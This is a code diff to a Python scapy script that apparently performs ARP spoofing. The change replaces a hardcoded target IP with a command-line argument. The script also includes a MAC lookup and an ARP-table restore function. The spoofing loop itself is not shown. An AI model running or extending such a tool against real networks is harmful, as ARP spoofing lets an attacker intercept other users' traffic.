@@ -2,6 +2,15 @@
 import scapy.all as scapy
 import time
 import sys
+import argparse
+
+def get_ips():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--ip_address", dest="ip_address", help="[-] Target's ip-address")
+    arg = parser.parse_args()
+    if not arg.ip_address:
+        parser.error("[-] Target's ip address required")
+    return arg.ip_address
 
 def get_mac_address(ip):
     arp_req = scapy.ARP(pdst=ip)
@@ -18,7 +27,7 @@ def restore(dst_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac_address(dst_ip), psrc=src_ip, hwsrc=get_mac_address(src_ip))
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "10.0.2.15"
+target_ip = get_ips()
 router_ip = "10.0.2.1"
 packets_amount = 0
 
